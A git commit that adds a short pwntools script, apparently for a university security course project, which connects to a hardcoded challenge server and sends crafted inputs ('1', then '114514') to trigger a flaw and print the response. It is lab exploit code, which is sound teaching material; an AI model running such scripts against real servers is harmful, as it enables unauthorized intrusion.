6b30d99bf80a3b82e7c29e68110b1ce6fa59902c
clai <charlielai.15@gmail.com>
2024-06-01 23:04:41 +0800

    Create task1-1.py

---
+++ csc2024-project4/.data/home/clai/task1-1.py
@@ -0,0 +1,14 @@
+import pwn
+
+if __name__ == '__main__':
+    server = "140.113.24.241"
+    port   = 30170
+    conn   = pwn.remote(server, port)
+
+    conn.recv(1024).decode("utf-8")
+    conn.sendline(b'1')
+    conn.recvline().decode("utf-8")
+    conn.sendline(b'114514')
+
+    print(conn.recvline().decode("utf-8"), end = "")
+    print(conn.recvline().decode("utf-8"), end = "")
